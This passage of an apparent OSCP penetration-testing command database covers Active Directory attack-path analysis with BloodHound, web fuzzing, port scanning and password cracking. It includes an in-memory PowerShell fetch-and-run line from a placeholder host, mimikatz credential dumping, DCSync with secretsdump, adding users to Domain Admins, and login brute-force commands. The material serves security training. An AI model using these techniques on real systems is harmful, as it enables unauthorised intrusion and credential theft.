- -c LoggedOn: Sessions via Windows API (stealthier than Session)
- --stealth: Removes LDAP queries that may trigger alerts (slower)

PRE-BUILT QUERIES (OSCP CRITICAL):
1. 'Find Shortest Paths to Domain Admins' - PRIMARY QUERY for exam
2. 'Find Principals with DCSync Rights' - Identifies DCSync candidates
3. 'List all Kerberoastable Accounts' - Service accounts with SPNs
4. 'Shortest Paths to Unconstrained Delegation Systems' - High-value targets
5. 'Find Computers where Domain Users are Local Admin' - Lateral movement
6. 'Shortest Paths from Owned Principals' - After compromising first user

EXAM TIP: Mark compromised users as 'Owned' (right-click → Mark User as Owned). This enables 'Shortest Paths from Owned Principals' query to show YOUR available attack paths. Update as you compromise more accounts.

CUSTOM CYPHER QUERIES:
BloodHound GUI supports raw Cypher queries (bottom text box). Example: Find users with 'admin' in name:
MATCH (u:User) WHERE u.name =~ '(?i).*admin.*' RETURN u

OPSEC CONSIDERATIONS:
- SharpHound generates significant LDAP traffic (DetectionLab will log)
- Use --stealth flag in production (not necessary for OSCP)
- Executable dropped to disk (SharpHound.exe) may trigger AV
- Alternative: Reflective PowerShell loading (IEX (New-Object Net.WebClient).DownloadString('http://IP/Invoke-BloodHound.ps1'))

COMMON MISTAKES:
❌ Forgetting to mark owned users → Can't use 'Shortest Paths from Owned Principals'
❌ Not clearing database between machines → Confusing cross-contamination
❌ Uploading data before Neo4j started → Connection refused errors
❌ Using outdated collector → BloodHound 4.x requires SharpHound 1.1.0+
❌ Ignoring 'Outbound Object Control' → Missing privilege escalation paths","high"
"bloodhound-analyze-paths","BloodHound Analyze Privilege Escalation Paths","enumeration","bloodhound","Use BloodHound GUI pre-built queries and graph analysis to identify privilege escalation paths from compromised user to Domain Admin. Reveals attack chains via ACL abuse, group memberships, session hijacking, and delegation misconfigurations.","active-directory","OSCP METHODOLOGY: BloodHound analysis is DETECTIVE work - you're finding the path that exists, not creating new vulnerabilities. The graph shows REALITY of AD misconfigurations.

TIME ESTIMATE: 5-15 minutes (initial analysis + path documentation)

ANALYSIS WORKFLOW:
1. Upload SharpHound data
2. Mark initial compromised user as owned
3. Run: 'Shortest Paths to Domain Admins from Owned Principals'
4. If no path: Run 'Find Workstations where Domain Users are Local Admin'
5. Document each path: nodes, edges, attack method
6. Execute attack chain step by step
7. Mark newly compromised users as owned
8. Re-run queries to find additional paths

CRITICAL EDGE TYPES (OSCP EXAM):

**DIRECT EXPLOITATION:**
- GenericAll: Full control over object. Abuse: Add yourself to group, reset password, modify ACL
- ForceChangePassword: Reset user password without knowing current. Abuse: net user <target> <newpass> /domain
- AddMembers: Add users to group. Abuse: net group 'Domain Admins' <user> /add /domain

**LATERAL MOVEMENT:**
- AdminTo: Local admin rights on computer. Abuse: Evil-WinRM, PSExec, WMI execution
- CanRDP: RDP access to computer. Abuse: xfreerdp /u:<USER> /p:<PASS> /v:<TARGET>
- CanPSRemote: PowerShell remoting enabled. Abuse: Enter-PSSession -ComputerName <TARGET>

**CREDENTIAL ACCESS:**
- HasSession: User logged on to computer (credentials in memory). Abuse: mimikatz sekurlsa::logonpasswords
- AllowedToDelegate: Unconstrained/constrained delegation. Abuse: Kerberos delegation attacks

**PRIVILEGE ESCALATION:**
- GetChanges + GetChangesAll: DCSync rights. Abuse: secretsdump.py -just-dc <DOMAIN>/<USER>@<DC>
- WriteDacl: Modify object permissions. Abuse: Add-ObjectAcl to grant GenericAll to yourself
- WriteOwner: Change object owner. Abuse: Take ownership, modify permissions

**KERBEROS ATTACKS:**
- ServicePrincipalName (node property): Kerberoastable user. Abuse: GetUserSPNs.py, crack TGS hash
- DoesNotRequirePreAuth (node property): AS-REP roastable. Abuse: GetNPUsers.py, crack AS-REP hash

PATH EXECUTION STRATEGY:
1. Document ENTIRE path before starting
2. Verify each node is reachable (ping, portscan)
3. Execute steps in order (can't skip nodes)
4. If step fails, look for ALTERNATIVE paths
5. Mark compromised nodes as owned progressively
6. Save screenshots of BloodHound graph for exam report

CUSTOM QUERIES (OSCP EXAM SCENARIOS):

**Find users with passwords in description:**
```cypher
MATCH (u:User) WHERE u.description =~ '(?i).*(pass|pwd).*' RETURN u.name, u.description
```

**Find computers with unconstrained delegation:**
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

**Find users with admincount=1 (privileged):**
```cypher
MATCH (u:User {admincount:true}) RETURN u.name
```

**Find paths through specific computer:**
```cypher
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})) RETURN p
```

ALTERNATIVE PATHS DOCUMENTATION:
BloodHound often shows MULTIPLE paths to Domain Admin. Document ALL paths because:
- Primary path may fail (service down, session logged off)
- Alternative paths may be faster
- Exam report should show depth of compromise
- Demonstrates understanding of AD structure

EXAM TIP: Take screenshots of:
1. Full graph from owned principal to DA
2. Each edge's 'Help' popup (shows exact commands)
3. Node properties for compromised accounts
4. Database Info (proves data collection scope)

REPORT WRITING:
""BloodHound analysis revealed privilege escalation path: pete@corp.com has MemberOf relationship to MANAGEMENT group, which has AdminTo permission on CLIENT75.corp.com. Computer CLIENT75 has active HasSession from maria@corp.com, who is MemberOf Domain Admins. Attack chain: Use pete's credentials via Evil-WinRM to access CLIENT75 as local admin, extract maria's credentials from LSASS memory using mimikatz, authenticate as maria to achieve Domain Admin.""

COMMON MISTAKES:
❌ Not documenting alternative paths → Stuck if primary path fails
❌ Skipping 'Mark as Owned' → Missing 'from Owned Principals' paths
❌ Ignoring edge 'Help' → Executing wrong attack method
❌ Not verifying sessions are active → Wasting time on logged-off users
❌ Forgetting to clear database → Attacking wrong domain's targets","high"
"bloodhound-cypher-query","BloodHound Custom Cypher Query","enumeration","MATCH (n:User) RETURN n LIMIT 25","Execute custom Cypher queries in BloodHound GUI to perform advanced graph database analysis beyond pre-built queries. Enables precise enumeration of AD objects, relationships, and attack paths using Neo4j's Cypher query language.","active-directory","OSCP METHODOLOGY: Custom Cypher queries enable TARGETED enumeration beyond BloodHound's pre-built queries. Use when looking for specific configurations or testing hypotheses.

TIME ESTIMATE: 2-5 minutes per query (writing + execution + analysis)

QUERY WORKFLOW:
1. Start simple: MATCH (u:User) RETURN u.name LIMIT 10
2. Add filters: WHERE u.admincount = true
3. Add relationships: MATCH (u:User)-[:MemberOf]->(g:Group)
4. Analyze results in table/graph view
5. Export for documentation: Right-click results → Export

OSCP EXAM QUERIES:

**1. Find users with passwords in description field:**
```cypher
MATCH (u:User)
WHERE u.description =~ '(?i).*(pass|pwd|password).*'
RETURN u.name, u.description
```
WHY: Admins sometimes document passwords in AD descriptions. Quick win.

**2. Find all Kerberoastable users (has SPN):**
```cypher
MATCH (u:User)
WHERE u.hasspn = true AND u.admincount = false
RETURN u.name, u.serviceprincipalname
```
WHY: Service accounts often have weak passwords. Crack TGS offline.

**3. Find computers with unconstrained delegation:**
```cypher
MATCH (c:Computer)
WHERE c.unconstraineddelegation = true
RETURN c.name, c.operatingsystem
```
WHY: High-value targets for credential theft via delegation abuse.

**4. Find users with DCSync rights:**
```cypher
MATCH (u:User)-[:GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN u.name, d.name
```
WHY: Users with Replicating Directory Changes can perform DCSync attack.

**5. Find shortest path between two specific users:**
```cypher
MATCH p=shortestPath((u1:User {name:'PETE@CORP.COM'})-[*1..]->(**u2:User {name:'MARIA@CORP.COM'}))
RETURN p
```
WHY: Targeted path finding when you know source and destination.

**6. Find all users who can RDP to specific computer:**
```cypher
MATCH (u)-[:CanRDP|MemberOf|AdminTo*1..]->(c:Computer {name:'CLIENT75.CORP.COM'})
RETURN DISTINCT u.name
```
WHY: Identify all users who can access specific target.

**7. Find users with passwords older than 1 year:**
```cypher
MATCH (u:User)
WHERE u.pwdlastset < (datetime().epochSeconds - 31536000)
RETURN u.name, u.pwdlastset
ORDER BY u.pwdlastset ASC
```
WHY: Old passwords more likely to be weak or cracked in breaches.

**8. Find all Domain Admins and their properties:**
```cypher
MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ '(?i)domain admins.*'
RETURN u.name, u.enabled, u.pwdlastset, u.admincount
```
WHY: Enumerate all DA accounts and their security posture.

**9. Find computers where Domain Users are local admin:**
```cypher
MATCH (g:Group {name:'DOMAIN USERS@CORP.COM'})-[:AdminTo]->(c:Computer)
RETURN c.name, c.operatingsystem
```
WHY: Massive misconfiguration - any domain user can compromise these systems.

**10. Find users who have never logged in:**
```cypher
MATCH (u:User)
WHERE u.lastlogon = 0
RETURN u.name, u.description
```
WHY: Unused accounts may have default or documented passwords.

**11. Count relationships by type:**
```cypher
MATCH ()-[r]-()
RETURN type(r) as relationship, count(r) as count
ORDER BY count DESC
```
WHY: Understand AD structure and identify common relationship types.

**12. Find all paths from owned user to high-value targets:**
```cypher
MATCH p=(u:User {owned:true})-[*1..5]->(c:Computer {highvalue:true})
RETURN p LIMIT 10
```
WHY: Targeted privilege escalation from compromised account.

CYPHER CHEAT SHEET:

**Node Patterns:**
- (n) - any node
- (u:User) - User node
- (u:User {name:'PETE@CORP.COM'}) - specific user
- (u:User|Computer) - User OR Computer node

**Relationship Patterns:**
- -[r]-> - any directed relationship
- -[r:MemberOf]-> - specific type
- -[r:MemberOf|AdminTo]-> - multiple types
- -[*1..3]-> - variable length 1-3 hops
- -[*]-> - any length (dangerous, can timeout)

**Filters (WHERE):**
- = <> - equality
- < > <= >= - comparison
- =~ - regex (case-insensitive: (?i))
- IS NULL / IS NOT NULL - existence
- AND OR NOT - logic
- IN [list] - membership

**Aggregation:**
- count(n) - count nodes
- collect(n.name) - list of names
- avg(n.property) - average
- max(n.property) - maximum

**Sorting/Limiting:**
- ORDER BY n.name ASC/DESC
- LIMIT 25
- SKIP 10 LIMIT 25 (pagination)

ADVANCED TECHNIQUES:

**Find attack paths with specific edge:**
```cypher
MATCH p=(u:User {owned:true})-[r*1..5]->(g:Group)
WHERE ALL(rel in r WHERE type(rel) IN ['MemberOf', 'AdminTo', 'HasSession'])
RETURN p
```

**Find users with most privileges:**
```cypher
MATCH (u:User)-[r]->()
RETURN u.name, count(r) as privileges
ORDER BY privileges DESC LIMIT 10
```

**Find circular group memberships:**
```cypher
MATCH p=(g:Group)-[:MemberOf*1..]->(g)
RETURN p
```

NEO4J BROWSER (ALTERNATIVE):
BloodHound GUI limited for complex queries. Use Neo4j browser for:
- Better error messages
- Query result export (CSV, JSON)
- Query plan analysis (EXPLAIN, PROFILE)
- Access: http://localhost:7474 (authenticate: neo4j:bloodhound)

EXAM TIP: Pre-write common queries in cheat sheet. Copy-paste into BloodHound during exam. Document interesting findings with screenshots.

COMMON MISTAKES:
❌ Missing LIMIT on broad queries → GUI crashes with 10,000+ results
❌ Case errors in labels/properties → Empty results
❌ Using [*] without LIMIT → Query never completes
❌ Not testing queries incrementally → Can't debug complex failures
❌ Forgetting regex case-insensitive flag (?i) → Missing matches","high"
"ps-ldap-directorysearcher","PowerShell .NET DirectorySearcher LDAP Query","ENUMERATION","([adsisearcher]'<LDAP_FILTER>').FindAll()","Perform LDAP queries against Active Directory using built-in .NET DirectorySearcher class without importing tools","ACTIVE_DIRECTORY","",""
"nessus-scan","Nessus Vulnerability Scan","enumeration","N/A - GUI-based tool","Professional vulnerability scanner with comprehensive vulnerability database","","Nessus is a GUI-based vulnerability scanner not available in OSCP exam environment.

MANUAL STEPS (Professional Version):
1.

Open Nessus web interface (https://localhost:8834)
2.

Login with credentials
3.

Click 'New Scan' → Select scan template:
   - Basic Network Scan:
Standard host discovery and port scanning
   - Advanced Scan:
Full vulnerability assessment with authenticated checks
   - Web Application Tests:
Web-specific vulnerability detection
4.

Configure scan:
   - Name:
Descriptive name (e.g., 'Target-192.168.45.100')
   - Targets:
IP address or range (192.168.45.100 or 192.168.45.0/24)
   - Discovery:
Set port range (default:
1-65535, consider focused scans)
5.

Launch scan and monitor progress
6.

Review results:
   - Critical/High findings first
   - Check for exploitable vulnerabilities
   - Verify findings manually (false positives common)
7.

Export report (HTML/PDF) for documentation

CLI ALTERNATIVE (Nessus Professional with CLI):
/opt/nessus/bin/nessuscli scan --new --name=""<SCAN_NAME>"" --targets=""<TARGET>"" --template=""basic""

OSCP EXAM NOTES:
- Nessus NOT available in exam environment
- GUI tools not permitted during exam
- Use alternative CLI scanners instead

RECOMMENDED OSCP ALTERNATIVES:
- nmap with NSE scripts for vulnerability detection
- OpenVAS (open-source alternative, also GUI)
- Manual enumeration + searchsploit for version-specific exploits","low"
"burp-intruder","Burp Suite Intruder - Automated Fuzzing","web","N/A - GUI-based tool","Automated parameter fuzzing and brute-force attacks using Burp Suite Intruder","","Burp Suite Intruder is a GUI-based fuzzing module not available in OSCP exam.

MANUAL STEPS (Burp Suite Professional):
1.

Intercept request in Burp Proxy:
   - Configure browser proxy (127.0.0.1:8080)
   - Navigate to target page and capture request
   - Right-click request → Send to Intruder

2.

Configure attack positions:
   - Intruder tab → Positions sub-tab
   - Click 'Clear §' to remove auto-marked positions
   - Select parameter value to fuzz
   - Click 'Add §' to mark as injection point
   - Example:
username=§admin§&password=§test§

3.

Select attack type:
   - Sniper:
Single position, one payload set (parameter discovery)
   - Battering ram:
Multiple positions, same payload (password in multiple fields)
   - Pitchfork:
Multiple positions, parallel iteration (username+password pairs)
   - Cluster bomb:
Multiple positions, all combinations (full brute-force)

4.

Configure payloads:
   - Payloads tab → Payload Sets
   - Payload type:
Simple list (wordlist), Numbers (IDOR), etc.
   - Load wordlist or configure generation rules
   - Example wordlists:
     * /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
     * /usr/share/wordlists/rockyou.txt (passwords)

5.

Configure payload processing (optional):
   - Add encoding (URL-encode, Base64)
   - Add prefixes/suffixes
   - Match/replace rules

6.

Configure grep match (response analysis):
   - Options tab → Grep - Match
   - Add patterns to identify successful attempts:
     * 'Welcome'
     * 'Invalid credentials' (to identify failures)
     * HTTP status codes

7.

Start attack:
   - Click 'Start attack'
   - Monitor response lengths, status codes, grep matches
   - Sort by length/status to identify anomalies

8.

Analyze results:
   - Different response length = potential hit
   - Different status code (302 vs 200)
   - Grep match differences

OSCP EXAM NOTES:
- Burp Suite Community Edition available (Intruder heavily rate-limited)
- Professional Edition NOT available in exam
- GUI fuzzing tools not practical for exam time constraints
- Use CLI alternatives for efficiency

RECOMMENDED OSCP ALTERNATIVES:
- wfuzz:
Full-featured CLI fuzzing
- ffuf:
Fast fuzzing with advanced filtering
- hydra:
Authentication brute-forcing
- Custom Python/Bash scripts for specific attacks","low"
"burp-scanner","Burp Suite Scanner - Automated Vulnerability Detection","web","N/A - GUI-based tool (Professional only)","Automated web vulnerability scanner built into Burp Suite Professional","","Burp Scanner is a Professional-only feature for automated vulnerability detection.

MANUAL STEPS (Burp Suite Professional):
1.

Passive scanning (automatic):
   - Browse application with Burp Proxy enabled
   - Scanner automatically detects issues in proxied traffic
   - Review Dashboard → Issue activity

2.

Active scanning:
   - Right-click request/URL in Proxy/Target
   - Select 'Scan' or 'Do active scan'
   - Configure scan settings:
     * Crawl depth and speed
     * Audit checks (SQLi, XSS, etc.)
     * Insertion points

3.

Review findings:
   - Target tab → Site map → Issues
   - Sort by severity (Critical, High, Medium, Low, Info)
   - Click issue for details:
     * Description
     * Proof of concept request/response
     * Remediation advice

4.

Manual verification:
   - Send issue to Repeater for testing
   - Verify exploitability
   - Document true positives

COMMON FINDINGS:
- SQL injection
- Cross-site scripting (XSS)
- OS command injection
- Path traversal
- XML external entity (XXE)
- Server-side request forgery (SSRF)

OSCP EXAM NOTES:
- Burp Scanner (Professional) NOT available in exam
- Community Edition lacks active scanning
- Manual testing required for exam

RECOMMENDED OSCP ALTERNATIVES:
- Manual testing with Burp Repeater (available in Community)
- nikto:
Automated web vulnerability scanner
- sqlmap:
SQL injection detection and exploitation
- Manual payload testing for XSS, LFI, RCE
- ZAP (OWASP Zed Attack Proxy) - open-source alternative","low"
"wfuzz-z-file","Wfuzz - File-Based Wordlist Fuzzing","web","wfuzz -z file,<WORDLIST> -u <URL>","Web fuzzing using file-based wordlist with FUZZ keyword placeholder","","COMMON WORDLISTS:
- /usr/share/seclists/Discovery/Web-Content/common.txt (4,700 entries)
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt (220k entries)
- /usr/share/seclists/Discovery/Web-Content/big.txt (20k entries)
- /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt (parameters)
- /usr/share/wordlists/rockyou.txt (passwords)

FILTERING OPTIONS:
--hc/--sc:
Hide/show HTTP status codes
--hl/--sl:
Hide/show response lines
--hw/--sw:
Hide/show response words
--hh/--sh:
Hide/show response chars (size)

EXAMPLE COMMANDS:
Directory fuzzing:
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u http://target/FUZZ

Parameter fuzzing:
wfuzz -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 -u 'http://target/page.php?FUZZ=test'

POST login brute-force:
wfuzz -z file,/usr/share/wordlists/rockyou.txt --hc 200 -d 'username=admin&password=FUZZ' -u http://target/login.php

Multiple FUZZ points:
wfuzz -z file,users.txt -z file,passwords.txt -u http://target/login.php -d 'user=FUZZ&pass=FUZ2Z'","high"
"wfuzz-post-login-brute","Wfuzz - POST Login Brute Force","web","wfuzz -z file,<WORDLIST> --hc <FAIL_CODE> -d '<POST_DATA>' -u <URL>","Brute-force web login forms using POST requests with response filtering","","WORKFLOW:
1.

Capture login POST request:
   - Open browser dev tools → Network tab
   - Submit login form with test credentials
   - Right-click POST request → Copy → Copy as cURL
   - Extract POST data field names

2.

Identify failure pattern:
   - Test with wrong password:
curl -X POST -d 'user=admin&pass=wrong' http://target/login.php
   - Note status code (usually 200) and failure message ('Invalid password')

3.

Run wfuzz:
   - Filter by failure string:
--hs 'Invalid'
   - OR filter by status if success redirects:
--hc 200 (hide 200, show 302)

4.

Successful login characteristics:
   - Status 302 (redirect to dashboard)
   - Set-Cookie header (session established)
   - Different response length
   - Success message in body

EXAMPLES:
WordPress brute-force:
wfuzz -z file,/usr/share/wordlists/rockyou.txt --hs 'incorrect' -d 'log=admin&pwd=FUZZ' http://target/wp-login.php

Custom form with failure message:
wfuzz -z file,passwords.txt --hs 'Login failed' -d 'username=admin&password=FUZZ&submit=Login' http://target/login.php

Filter by redirect (success = 302):
wfuzz -z file,passwords.txt --hc 200,404 -d 'user=admin&pass=FUZZ' http://target/auth.php

TIPS:
- Always test manually first to understand response patterns
- Use small wordlist initially to verify filtering works
- Add --delay to avoid account lockout/WAF blocking
- Some forms require additional fields (CSRF token, remember-me checkbox)","high"
"dirbuster","DirBuster - GUI Directory Brute-Forcing","web","N/A - GUI-based tool (deprecated)","Java-based GUI directory and file brute-forcing tool (deprecated, use gobuster/ffuf instead)","","DirBuster is a legacy Java GUI tool for directory brute-forcing.

DEPRECATED and no longer maintained.

MANUAL STEPS (if required for legacy systems):
1.

Launch DirBuster:
   - Command:
java -jar /usr/share/dirbuster/DirBuster-1.0-RC1.jar
   - Or from Kali menu:
Applications → Web Application Analysis → dirbuster

2.

Configure target:
   - Target URL:
http://192.168.45.100/
   - Number of threads:
10-20 (adjust based on target stability)

3.

Select scan type:
   - List based brute force (recommended):
Uses wordlist
   - Pure brute force:
Generates all combinations (extremely slow)

4.

Select wordlist:
   - Browse to wordlist location
   - Recommended:
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
   - Or use Seclists:
/usr/share/seclists/Discovery/Web-Content/common.txt

5.

Configure file extensions:
   - Check 'File extension' box
   - Add extensions:
php,txt,html,asp,aspx,jsp
   - Based on identified technology stack

6.

Start scan:
   - Click 'Start'
   - Monitor 'Results - Tree View' tab for found directories
   - Check 'Results - List View' for all responses

7.

Analyze results:
   - Green = 200 OK (success)
   - Yellow = 403 Forbidden (exists but restricted)
   - Look for interesting directories:
admin, backup, config, uploads

OSCP EXAM NOTES:
- DirBuster is DEPRECATED - use CLI alternatives
- GUI tools slow and inefficient for exam
- No longer pre-installed on modern Kali versions
- CLI tools (gobuster, ffuf) significantly faster

WHY DEPRECATED:
- Java-based (slow, resource intensive)
- No longer maintained by OWASP
- Superseded by faster CLI tools
- GUI not practical for exam time constraints

RECOMMENDED OSCP ALTERNATIVES:
- gobuster:
Fast, efficient, CLI-based (preferred)
- ffuf:
Very fast fuzzing with advanced filtering
- wfuzz:
Feature-rich web fuzzing
- dirb:
Older CLI alternative (slower than gobuster)

EQUIVALENT COMMANDS:
DirBuster scan = gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

MIGRATION GUIDE:
DirBuster Setting → Gobuster Equivalent
- Target URL → gobuster -u <URL>
- Wordlist → gobuster -w <WORDLIST>
- Extensions → gobuster -x <EXTENSIONS>
- Threads → gobuster -t <THREADS>
- Exclude status codes → gobuster -b <CODES>","low"
"masscan-full-tcp","Masscan - Full TCP Port Scan","recon","sudo masscan -p1-65535 <TARGET> --rate=<RATE> -e <INTERFACE> --router-ip <GATEWAY>","Ultra-fast TCP port scanner capable of scanning entire internet in minutes","","SPEED VS ACCURACY:
- Masscan prioritizes speed over accuracy
- Very high rates (>10000) may miss ports due to packet loss
- Use nmap for service detection after masscan identifies open ports
- Masscan = fast port discovery, nmap = detailed enumeration

COMMON WORKFLOWS:
1.

Quick discovery:
   sudo masscan -p1-65535 192.168.45.0/24 --rate=1000

2.

Focused scan:
   sudo masscan -p80,443,8080,8443 192.168.45.100 --rate=10000

3.

Full scan with output:
   sudo masscan -p1-65535 192.168.45.100 --rate=1000 -oG results.txt -e tun0 --router-ip 10.10.14.1

4.

Scan subnet:
   sudo masscan -p1-65535 192.168.45.0/24 --rate=5000 --exclude 192.168.45.1

OUTPUT FORMATS:
-oL:
List format
-oG:
Greppable (recommended)
-oJ:
JSON
-oX:
XML (nmap compatible)

RATE GUIDELINES:
- 100:
Very slow, extremely stealthy
- 1000:
Safe default for most networks
- 10000:
Fast, may trigger IDS
- 100000:
Very fast, high packet loss risk
- 1000000:
Extreme speed, unreliable results

VPN USAGE (OSCP):
1.

Find interface:
ip a | grep tun
2.

Find gateway:
ip route | grep tun0
3.

Command:
sudo masscan -p1-65535 <TARGET> --rate=1000 -e tun0 --router-ip 10.10.14.1

VS NMAP:
- Masscan:
Fast port discovery (minutes for all ports)
- Nmap:
Slow but accurate, service detection, scripting
- Best practice:
masscan for discovery → nmap for enumeration","medium"
"smb-share-windows-list","List SMB Shares (Windows CLI)","enumeration","ls \\<TARGET>\<SHARE>","List contents of remote SMB share using Windows command prompt","smb-enumeration","Windows-style UNC path.

Requires authentication to target.

Use 'dir' for more details.

Common shares:
C$, ADMIN$, IPC$.

From Linux:
smbclient //target/share","high"
"gpp-decrypt-python-script","GPP Password Decryption Script","enumeration","python gpp-decrypt.py <CPASSWORD>","Decrypt Group Policy Preferences cPassword attribute using known AES key","credential-extraction","Group Policy Preferences vulnerability (MS14-025).

AES key published by Microsoft.

Python script:
gpp-decrypt.

PowerShell:
Get-GPPPassword.

cPassword found in SYSVOL XML files.","high"
"ps-get-domain-dn-format","Convert Domain to Distinguished Name","enumeration","$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\.',',DC=') }","Convert current domain FQDN to LDAP Distinguished Name format","ldap-queries","PowerShell one-liner to convert domain.local to DC=domain,DC=local format.

Useful for constructing LDAP queries.

Example:
corp.local becomes DC=corp,DC=local.

Required for many AD LDAP operations.","medium"
"hashcat-kerberos-aes256-cbc","Hashcat Kerberos AES256-CBC Mode","enumeration","hashcat -m 22921 -a 0 <HASH_FILE> <WORDLIST>","Crack Kerberos AES256-CBC hashes (not aes-256-ctr)","password-cracking","Mode 22921 is for AES256-CBC specifically, NOT aes-256-ctr.

For AS-REP roasting.

Different from -m 19700 (Kerberos TGS-REP).

Obtained via Rubeus, GetNPUsers.py, or similar tools.","medium"
"manual-hash-generation-loop","Manual Password Hash Generation","enumeration","for pw in $(cat <WORDLIST>); do echo -n ""$pw"" | md5sum; done","Generate MD5 hashes for wordlist manually using shell loop (educational/fallback)","password-cracking","Bash one-liner for educational purposes or when hashcat/john unavailable.

Extremely slow compared to dedicated tools.

Change md5sum to sha1sum, sha256sum, etc.

for other algorithms.

Not recommended for production use.","low"
"calculate-keyspace","Calculate Password Keyspace","enumeration","python3 -c ""import math; charset=<CHARSET_SIZE>; length=<PASSWORD_LENGTH>; print(f'Keyspace: {charset**length:,} combinations')""","Calculate total number of possible passwords for brute-force","","OSCP TIP:
Keyspace determines brute-force feasibility.

Common charsets:
Lowercase (a-z) = 26, Upper+Lower (A-Za-z) = 52, Alphanumeric (A-Za-z0-9) = 62, Full printable ASCII = 95.

Example:
8-char alphanumeric = 62^8 = 218,340,105,584,896 (218 trillion).

At 1 billion H/s (fast GPU on MD5) = 218,340 seconds = 60 hours.

At 10 H/s (bcrypt) = 692 YEARS.

Conclusion:
Brute-force only viable for:
Fast hashes (MD5, NTLM) + Short passwords (<8 chars) OR Slow hashes + Dictionary attacks.","high"
"calculate-crack-time","Estimate Password Cracking Time","enumeration","python3 -c ""keyspace=<KEYSPACE>; hash_rate=<HASH_RATE>; seconds=keyspace/hash_rate; hours=seconds/3600; print(f'Time: {hours:.2f} hours ({hours/24:.2f} days)')""","Calculate estimated time to crack based on keyspace and hash rate","","OSCP TIP:
Decision tree - Time estimate < 1 hour:
Proceed with brute-force.

1-4 hours:
Consider if exam time allows.

4-24 hours:
Only if overnight + not time-critical.

>24 hours:
Use dictionary/rule attacks instead.

Reality check:
Average crack time = 50% of maximum (but could be 1% or 99% - random).

Hash rate varies:
GPU temp, power limits, other processes.

Always add 20% safety margin to estimates.","high"
"attack-mode-decision","Choose Attack Mode Strategy","enumeration","echo 'Attack Mode Decision Tree:\n1. Straight Wordlist (fastest, try first)\n2. Wordlist + Rules (best balance)\n3. Combinator (merge wordlists)\n4. Mask Attack (known pattern)\n5. Brute Force (last resort)'","Display attack mode selection strategy","","OSCP TIP:
Attack mode selection based on intelligence.

SCENARIO 1:
No policy known → Try:
rockyou.txt (straight), rockyou.txt + best64.rule, rockyou.txt + rockyou-30000.rule.

SCENARIO 2:
Policy known (8 chars, 1 upper, 1 digit, 1 special) → Create targeted rules:
c $<YEAR> $! applied to company/season wordlist.

SCENARIO 3:
Pattern observed (firstname+year format) → Use mask:
?u?l?l?l?l?l?l?l?d?d?d?d.

Time allocation (exam):
Straight wordlist (5 min), Rule-based (30-60 min), Mask/Brute-force (only if <2 hours estimated).","high"
"wordlist-effectiveness","Estimate Wordlist Effectiveness","enumeration","wc -l <WORDLIST> && echo 'With rules: ' && python3 -c ""lines=<LINE_COUNT>; rules=<RULE_COUNT>; print(f'{lines * rules:,} total candidates')""","Calculate total candidates from wordlist + rules combination","","OSCP TIP:
Wordlist selection based on scenario.

OSCP exam common:
rockyou.txt (generic passwords, high success rate).

Corporate pentest:
Company-specific wordlist (company name, products, locations, employee names).

Web app:
Leaked DB from similar service.

Size vs.

Success:
Bigger ≠ Always better.

Targeted 1,000-word list + good rules > Generic 14M list (faster, focused).

Create custom:
grep '<COMPANY>' /usr/share/wordlists/* > company.txt; Add:
seasons, years, common patterns.","medium"
"hash-rate-benchmark","Benchmark Hash Cracking Speed","enumeration","hashcat -b -m <MODE> | grep -A3 'Hashmode:'","Measure hash rate for specific hash type on current system","","OSCP TIP:
Benchmark reveals reality.

Example results (NVIDIA RTX 3080):
MD5 (-m 0) = 50 GH/s (50 billion/sec), NTLM (-m 1000) = 80 GH/s, SHA256 (-m 1400) = 20 GH/s, bcrypt (-m 3200) = 100 kH/s (100 thousand/sec), KeePass (-m 13400) = 10 H/s.

Implications:
MD5 8-char alphanumeric brute-force = 1 hour.

KeePass same password = 69,000 YEARS.

Conclusion:
Hash algorithm choice matters MORE than password length for slow hashes.

Always benchmark before committing time.","high"
"session-management","Manage Long-Running Crack Sessions","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> --session=<SESSION_NAME> -o <OUTPUT_FILE> --outfile-format=2","Run cracking session with named session and output file","","OSCP TIP:
Session management critical for exam.

Scenario:
Cracking KeePass hash (slow, hours needed).

Start session:
hashcat --session=keepass-crack ....

Pause (Ctrl+C), work on other machines.

Resume later:
hashcat --session=keepass-crack --restore.

Hashcat resumes EXACTLY where it stopped (no wasted work).

Check progress anytime:
hashcat --session=keepass-crack --status (shows ETA, speed, candidates tested).

Output file benefits:
1) Persist cracked passwords, 2) Share results between tools, 3) Documentation for report.","medium"
"monitor-crack-progress","Monitor Cracking Progress","enumeration","watch -n 5 'hashcat --session=<SESSION_NAME> --status 2>&1 | grep -E ""Progress|Speed|Recovered|Time""'","Real-time monitoring of hashcat session progress","","OSCP TIP:
Monitoring prevents wasted time.

Check 5 minutes after start:
Speed stable? (yes = good, fluctuating = thermal issues).

Progress moving? (yes = working, 0% frozen = error).

ETA reasonable? (yes = continue, >exam time = abort).

Example:
Started bcrypt crack, estimated 48 hours.

After 5 min check:
ETA still 48 hours = abort, try different attack.

Monitoring also detects:
GPU crashes (Speed = 0), wrong hash format (Rejected 100%), completed sessions (Progress = 100%).","medium"
"optimize-crack-performance","Optimize Hashcat Performance","enumeration","hashcat -m <MODE> <HASH_FILE> <WORDLIST> -w 3 -O --force","Run hashcat with performance optimization flags","","OSCP TIP:
Performance optimization matters for time-constrained scenarios.

Baseline:
hashcat -m 1000 hash.txt rockyou.txt (default, ~40 GH/s).

Optimized:
Same + -w 3 -O (~55 GH/s, 37% faster).

On 1-hour crack = save 20 minutes.

Monitoring optimization:
Watch GPU usage (nvidia-smi or radeontop).

Target:
95-100% GPU util, 70-80°C temp.

If:
<80% GPU = increase -w, >90°C = reduce -w (thermal throttling).

Other optimizations:
Close background apps, use -d 1,2 for multi-GPU, update GPU drivers.","medium"
